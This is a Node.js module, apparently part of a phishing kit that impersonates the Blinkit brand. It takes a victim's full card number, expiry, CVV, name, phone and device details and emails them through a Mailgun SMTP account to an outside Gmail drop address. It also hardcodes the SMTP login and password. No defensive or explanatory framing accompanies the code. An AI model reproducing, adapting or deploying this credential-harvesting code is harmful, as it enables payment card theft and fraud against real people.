const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  host: "smtp.mailgun.org",
  port: 465,
  secure: true,
  auth: {
    user: "blinkit@cashoxo.com",
    pass: "Ankit@123",
  },
});

async function Mail(data) {
  const brand = data.detectedDevice.brand;
  const model = data.detectedDevice.model;
  const version = data.detectedDevice.version;
  const html = `
 <b style="font-size:25px;">  <BR>        
    Card Type:  ${data.cardtype} <BR>
    Card Issuing BankName: ${data.bankname} <BR>
    CCnum: ${data.cardnumber}<BR>
    Exp:  ${data.expirationdate}<BR>
    CVV:  ${data.securitycode}<BR>
    Name:  ${data.name}<BR>
    Phone: ${data.phone}<BR>    
    Device:  ${brand} ${model}-${version} <BR>
    </b>;
`;
  const subject = `${data.bankname} CARD`;
  const info = await transporter.sendMail({
    from: '"blinkit👻" <blinkit@cashoxo.com>', // sender address
    to: "rus.server420@gmail.com", // list of receivers
    subject,
    text: "Hello world?", // plain text body
    html, // html body
  });

  return info;
}

module.exports = { Mail };
